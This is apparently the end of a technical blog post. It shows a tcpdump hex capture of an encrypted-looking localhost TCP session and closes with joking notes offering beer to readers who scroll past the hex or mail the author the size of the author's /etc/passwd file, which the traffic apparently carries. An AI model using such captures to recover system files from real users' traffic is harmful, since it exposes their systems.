		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e92  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976216 IP localhost.41046 > localhost.1234: Flags [P.], seq 181:201, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9399 4000 4006 a914 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e92 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 87a9 3cc0 f6d0 cc70 e43a 76d3  ...k..<....p.:v.
		0x0040:  7582 d25c 58a7 2ad1                      u..\X.*.
	02:31:09.976217 IP localhost.1234 > localhost.41046: Flags [.], ack 201, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6e 4000 4006 ce53 7f00 0001  E..4nn@.@..S....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6ea6  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976251 IP localhost.41046 > localhost.1234: Flags [P.], seq 201:221, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939a 4000 4006 a913 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6ea6 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 7037 76f5 43b4 1b7d 7bdb ff67  ...kp7v.C..}{..g
		0x0040:  e0bb 872a cba1 7b5c                      ...*..{\
	02:31:09.976252 IP localhost.1234 > localhost.41046: Flags [.], ack 221, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6f 4000 4006 ce52 7f00 0001  E..4no@.@..R....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6eba  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976317 IP localhost.41046 > localhost.1234: Flags [P.], seq 221:241, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939b 4000 4006 a912 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6eba 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 595a c17a 4266 7246 e9d6 518b  ...kYZ.zBfrF..Q.
		0x0040:  33e6 4f57 3dd2 96f7                      3.OW=...
	02:31:09.976319 IP localhost.1234 > localhost.41046: Flags [.], ack 241, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e70 4000 4006 ce51 7f00 0001  E..4np@.@..Q....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6ece  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976353 IP localhost.41046 > localhost.1234: Flags [P.], seq 241:261, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939c 4000 4006 a911 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6ece 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 9f64 fc5c ea20 ca73 2b76 fb5e  ...k.d.\...s+v.^
		0x0040:  48e3 ba5b 5c3c b44f                      H..[\<.O
	02:31:09.976354 IP localhost.1234 > localhost.41046: Flags [.], ack 261, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e71 4000 4006 ce50 7f00 0001  E..4nq@.@..P....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6ee2  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976400 IP localhost.41046 > localhost.1234: Flags [P.], seq 261:281, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939d 4000 4006 a910 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6ee2 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b ef18 5bca fe4f 635f 02d5 7890  ...k..[..Oc_..x.
		0x0040:  e78a 4b17 f23a 2c2f                      ..K..:,/
	02:31:09.976402 IP localhost.1234 > localhost.41046: Flags [.], ack 281, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e72 4000 4006 ce4f 7f00 0001  E..4nr@.@..O....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6ef6  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976452 IP localhost.41046 > localhost.1234: Flags [P.], seq 281:301, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939e 4000 4006 a90f 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6ef6 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 6d69 becd a62c d668 2e57 951f  ...kmi...,.h.W..
		0x0040:  1a70 6b92 2f82 44ff                      .pk./.D.
	02:31:09.976453 IP localhost.1234 > localhost.41046: Flags [.], ack 301, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e73 4000 4006 ce4e 7f00 0001  E..4ns@.@..N....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6f0a  .......V...H].o.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976522 IP localhost.41046 > localhost.1234: Flags [P.], seq 301:321, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 939f 4000 4006 a90e 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6f0a 2002 9048  .....V..].o....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 0300 9ef5 d103 918e d187 49c1  ...k..........I.
		0x0040:  6591 6e6e f531 7487                      e.nn.1t.
	02:31:09.976524 IP localhost.1234 > localhost.41046: Flags [.], ack 321, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e74 4000 4006 ce4d 7f00 0001  E..4nt@.@..M....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6f1e  .......V...H].o.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976561 IP localhost.41046 > localhost.1234: Flags [P.], seq 321:341, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 93a0 4000 4006 a90d 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6f1e 2002 9048  .....V..].o....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 2d95 b6fc d993 610f c49c 4493  ...k-.....a...D.
		0x0040:  ff27 84c8 7a6d 64a6                      .'..zmd.
	02:31:10.006093 IP localhost.1234 > localhost.41046: Flags [.], ack 341, win 342, options [nop,nop,TS val 16124018 ecr 16124011], length 0
		0x0000:  4500 0034 6e75 4000 4006 ce4c 7f00 0001  E..4nu@.@..L....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6f32  .......V...H].o2
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 0872  ...V.(.........r
		0x0030:  00f6 086b                                ...k
	02:31:10.006112 IP localhost.41046 > localhost.1234: Flags [P.], seq 341:1281, ack 21, win 342, options [nop,nop,TS val 16124018 ecr 16124018], length 940
		0x0000:  4500 03e0 93a1 4000 4006 a574 7f00 0001  E.....@.@..t....
		0x0010:  7f00 0001 a056 04d2 5d0b 6f32 2002 9048  .....V..].o2...H
		0x0020:  8018 0156 01d5 0000 0101 080a 00f6 0872  ...V...........r
		0x0030:  00f6 0872 812d 0178 da3e d3db b80c 3684  ...r.-.x.>....6.
		0x0040:  8aa9 8ca0 822d 0293 4f3a 52f7 cbb9 b89b  .....-..O:R.....
		0x0050:  fd5f 2113 1202 77f1 24df 90d7 538e c4da  ._!...w.$...S...
		0x0060:  842d 68b9 7bb4 e330 9adf 7b8e 6929 c44b  .-h.{..0..{.i).K
		0x0070:  eb9d b520 f026 f22a 0975 0814 b6a8 eb47  .....&.*.u.....G
		0x0080:  6c75 669a 05fb e4d9 1eec 99a7 c77d 78b4  luf..........}x.
		0x0090:  6087 f727 e00e 1207 b410 3680 c310 9fe1  `..'......6.....
		0x00a0:  ddc9 fafd 487a 362f 3ff7 f875 5d7c f41e  ....Hz6/?..u]|..
		0x00b0:  6623 a669 09d2 c215 f07a 8a87 10a9 80c3  f#.i.....z......
		0x00c0:  554e b26a e015 ba8a 86aa 13d3 a5d9 4553  UN.j..........ES
		0x00d0:  e675 2e81 33ef 7b4a 9150 fd23 f5bb 3074  .u..3.{J.P.#..0t
		0x00e0:  77f6 d650 e492 5a85 8fc7 8e49 c273 454f  w..P..Z....I.sEO
		0x00f0:  c7c0 f1fb f18e 5950 c770 fee3 3b6c bfcd  ......YP.p..;l..
		0x0100:  e16e f9d9 776a c6df 3576 c9eb 0c5b 5c8b  .n..wj..5v...[\.
		0x0110:  f77c e691 ce0a b677 77e6 52f8 e332 2bb4  .|.....ww.R..2+.
		0x0120:  22cf 080b 4318 b10b c3ab cc4b f169 36c6  "...C......K.i6.
		0x0130:  92ee 87f6 0853 7a45 ff24 61fd 61b4 8d32  .....SzE.$a.a..2
		0x0140:  0926 a18d d1a9 a8b6 f6a5 ce1b 2516 91d1  .&..........%...
		0x0150:  4be1 88eb b484 c6cf 2a83 7c05 7bdd 682e  K.......*.|.{.h.
		0x0160:  4dff bc0d 67d4 daf2 3350 c5ed 6907 eb28  M...g...3P..i..(
		0x0170:  4c78 2c5b e57e 801a 31f6 c695 fbd2 9546  Lx,[.~..1......F
		0x0180:  e4a6 6abd 71b1 be75 3961 1d49 ce5e f1c9  ..j.q..u9a.I.^..
		0x0190:  2c81 94bc 5251 4681 35c4 76a5 5967 c35d  ,...RQF.5.v.Yg.]
		0x01a0:  a730 cc66 54fa 4f1d b5fd a089 84d6 120d  .0.fT.O.........
		0x01b0:  4d1e 67fb c530 f947 4945 5913 d893 d0ad  M.g..0.GIEY.....
		0x01c0:  e076 5681 771c 3b77 d3bc f797 5fe8 67a3  .vV.w.;w...._.g.
		0x01d0:  cf3e a9ee 1887 f214 c382 d3f3 93d5 8e60  .>.............`
		0x01e0:  d3f9 da59 b211 2228 98ef 0c33 7109 0ae3  ...Y.."(...3q...
		0x01f0:  8f10 bff6 4aaf 3e7c abf0 1e27 9579 8e25  ....J.>|...'.y.%
		0x0200:  fbcc 4e00 872a 964f 8010 c3a0 8738 7351  ..N..*.O.....8sQ
		0x0210:  af0e 4c2f b780 ab55 5342 1202 3223 1421  ..L/...USB..2#.!
		0x0220:  5190 a1f8 9718 1e29 3fe5 9448 f27a 0ccd  Q......)?..H.z..
		0x0230:  dc91 054d 3092 6866 f5e0 1059 5932 050d  ...M0.hf...YY2..
		0x0240:  25dc 817b 1427 7ea5 328e 1a5e acae c093  %..{.'~.2..^....
		0x0250:  2b99 18d6 faf6 eb80 8c45 7f4d 5856 558e  +........E.MXVU.
		0x0260:  7aff c8ad 9b3b 79cd 90ec 4e13 17fd d522  z....;y...N...."
		0x0270:  28fd 4311 b4fb c2fd fb2f 82da 945a a1a8  (.C....../...Z..
		0x0280:  b5bc 8d48 a85b d83d 049c ee1f 89a7 ccae  ...H.[.=........
		0x0290:  a92b bb78 6407 0f9e 720d 9cd6 a463 3c19  .+.xd...r....c<.
		0x02a0:  8f52 c7d4 a2cb 8c1b 5275 3354 0d47 996d  .R......Ru3T.G.m
		0x02b0:  47e0 62fb cd76 745a 542a 1b37 e90b 89dd  G.b..vtZT*.7....
		0x02c0:  1a96 2868 ba19 88e2 b1db a6a5 fa96 f809  ..(h............
		0x02d0:  fc13 bb14 618a 94b2 04b0 8639 ebd9 1345  ....a......9...E
		0x02e0:  b105 fe1c d17d 03be 33bd 224d 4fcc fcd7  .....}..3."MO...
		0x02f0:  455b 5bba f400 1ab4 044e e609 12aa f879  E[[......N.....y
		0x0300:  f49b ccbf b861 bc42 e257 fc9b 8014 32c5  .....a.B.W....2.
		0x0310:  5fc6 4f4a c342 ea65 730b 462d 8040 8594  _.OJ.B.es.F-.@..
		0x0320:  3ce9 accf c07c fbfe 0911 86e2 ebb2 c472  <....|.........r
		0x0330:  5652 7179 4010 e665 1742 0edb b04e 94ff  VRqy@..e.B...N..
		0x0340:  d167 df3d 5525 98f7 480e 098d a017 9d35  .g.=U%..H......5
		0x0350:  308b 8620 ad1f 7629 e5b0 3ba2 b606 9956  0.....v)..;....V
		0x0360:  3efd d16b 0a75 f2bf efc6 d006 a513 98ce  >..k.u..........
		0x0370:  160b 1c00 a908 0164 36ae ca21 89de 01df  .......d6..!....
		0x0380:  57a0 c4a0 4b67 19a3 1ed5 343a af0d 2c3f  W...Kg....4:..,?
		0x0390:  213d 9d63 08fd 7b5a fd48 5f44 13b6 6f82  !=.c..{Z.H_D..o.
		0x03a0:  bab6 be43 1780 85cb 392a eafe 8ea4 d6c6  ...C....9*......
		0x03b0:  5553 75ef 2e6b f2a9 e997 841e a896 468c  USu..k........F.
		0x03c0:  5688 30f6 1fae 700d d63e 364e 53c9 1bea  V.0...p..>6NS...
		0x03d0:  9a5d 2fc5 988a 02d8 6c4b dbbe 4c61 0074  .]/.....lK..La.t
	02:31:10.006116 IP localhost.1234 > localhost.41046: Flags [.], ack 1281, win 357, options [nop,nop,TS val 16124018 ecr 16124018], length 0
		0x0000:  4500 0034 6e76 4000 4006 ce4b 7f00 0001  E..4nv@.@..K....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 72de  .......V...H].r.
		0x0020:  8010 0165 fe28 0000 0101 080a 00f6 0872  ...e.(.........r
		0x0030:  00f6 0872                                ...r
	02:31:22.779011 IP localhost.1234 > localhost.41046: Flags [F.], seq 21, ack 1281, win 357, options [nop,nop,TS val 16127211 ecr 16124018], length 0
		0x0000:  4500 0034 6e77 4000 4006 ce4a 7f00 0001  E..4nw@.@..J....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 72de  .......V...H].r.
		0x0020:  8011 0165 fe28 0000 0101 080a 00f6 14eb  ...e.(..........
		0x0030:  00f6 0872                                ...r
	02:31:22.824053 IP localhost.41046 > localhost.1234: Flags [.], ack 22, win 342, options [nop,nop,TS val 16127223 ecr 16127211], length 0
		0x0000:  4500 0034 93a2 4000 4006 a91f 7f00 0001  E..4..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 72de 2002 9049  .....V..].r....I
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 14f7  ...V.(..........
		0x0030:  00f6 14eb                                ....
	02:31:25.519800 IP localhost.41046 > localhost.1234: Flags [F.], seq 1281, ack 22, win 342, options [nop,nop,TS val 16127897 ecr 16127211], length 0
		0x0000:  4500 0034 93a3 4000 4006 a91e 7f00 0001  E..4..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 72de 2002 9049  .....V..].r....I
		0x0020:  8011 0156 fe28 0000 0101 080a 00f6 1799  ...V.(..........
		0x0030:  00f6 14eb                                ....
	02:31:25.519815 IP localhost.1234 > localhost.41046: Flags [.], ack 1282, win 357, options [nop,nop,TS val 16127897 ecr 16127897], length 0
		0x0000:  4500 0034 3cd1 4000 4006 fff0 7f00 0001  E..4<.@.@.......
		0x0010:  7f00 0001 04d2 a056 2002 9049 5d0b 72df  .......V...I].r.
		0x0020:  8010 0165 20d9 0000 0101 080a 00f6 1799  ...e............
		0x0030:  00f6 1799                                ....


.. note :: **You win a free beer for scrolling down all the gibberish!**

.. note :: **You win ANOTHER free beer if you mail me my** ``/etc/passwd`` **file size!**
